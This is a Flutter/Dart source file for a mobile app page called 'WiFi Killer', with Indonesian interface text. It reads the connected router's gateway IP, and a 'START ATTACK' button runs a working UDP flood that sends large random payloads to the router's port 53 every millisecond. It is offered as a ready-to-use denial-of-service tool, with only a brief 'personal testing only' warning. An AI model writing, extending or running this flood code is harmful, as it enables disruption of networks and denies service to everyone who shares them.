import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-"; // Placeholder, not supported by network_info_plus
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  // --- TEMA WARNA HITAM PUTIH ---
  final Color bgDark = const Color(0xFFCED4DA);     // Background Utama
  final Color cardDark = const Color(0xFFF8F9FA);    // Warna Kartu
  final Color primaryPurple = const Color(0xFFFF99AC);
  final Color accentPurple = const Color(0xFFFF99AC);
  final Color primaryWhite = Colors.black87;
  final Color textGrey = Colors.black54;

  // Gradients
  final LinearGradient purpleGradient = const LinearGradient(
    colors: [const Color(0xFFFF99AC), Color(0xFFFFFFFF)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Request location permission
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-"; // Not available in network_info_plus
      });

      debugPrint("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentPurple.withOpacity(0.3)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: accentPurple,
            fontSize: 18,
            fontWeight: FontWeight.bold,
            fontFamily: 'Orbitron',
          ),
        ),
        content: Text(
          message,
          style: TextStyle(
            color: primaryWhite,
            fontSize: 16,
            fontFamily: 'ShareTechMono',
          ),
        ),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                color: primaryPurple.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: accentPurple.withOpacity(0.3)),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text("OK", style: TextStyle(color: accentPurple, fontWeight: FontWeight.bold)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: textGrey, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: TextStyle(color: primaryWhite, fontFamily: 'ShareTechMono'))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: bgDark,
        iconTheme: IconThemeData(color: primaryWhite),
        title: Text("WiFi Killer", style: TextStyle(fontFamily: 'Orbitron', color: primaryWhite)),
        elevation: 0,
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              "Network Analysis",
              style: TextStyle(
                color: accentPurple,
                fontSize: 22,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron',
              ),
            ),
            const SizedBox(height: 10),
            Text(
              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi.",
              style: TextStyle(color: textGrey, fontSize: 14),
            ),
            const SizedBox(height: 20),

            // Info Card
            Container(
              decoration: BoxDecoration(
                color: cardDark,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: primaryPurple.withOpacity(0.3)),
                boxShadow: [
                  BoxShadow(
                    color: primaryPurple.withOpacity(0.1),
                    blurRadius: 10,
                    offset: Offset(0, 5),
                  ),
                ],
              ),
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP Address", ip),
                  _infoRow("Frequency", "$frequency MHz"),
                  _infoRow("Router IP", routerIp),
                ],
              ),
            ),

            const SizedBox(height: 40),

            // Action Button
            Center(
              child: Container(
                height: 60,
                width: double.infinity,
                decoration: BoxDecoration(
                  gradient: isKilling ? null : purpleGradient,
                  color: isKilling ? const Color(0xFFFF99AC) : null,
                  borderRadius: BorderRadius.circular(25),
                  boxShadow: [
                    BoxShadow(
                      color: isKilling ? Colors.transparent : primaryPurple.withOpacity(0.4),
                      blurRadius: 15,
                      offset: Offset(0, 5),
                    ),
                  ],
                ),
                child: ElevatedButton.icon(
                  onPressed: isKilling ? _stopFlood : _startFlood,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                  ),
                  icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, color: primaryWhite, size: 24),
                  label: Text(
                    isKilling ? "STOP ATTACK" : "START ATTACK",
                    style: TextStyle(fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron', color: primaryWhite, fontWeight: FontWeight.bold),
                  ),
                ),
              ),
            ),

            const SizedBox(height: 20),

            if (isKilling)
              Center(
                child: Column(
                  children: [
                    CircularProgressIndicator(color: accentPurple),
                    SizedBox(height: 10),
                    Text(
                      "Sending Packets...",
                      style: TextStyle(color: accentPurple, fontFamily: 'ShareTechMono'),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}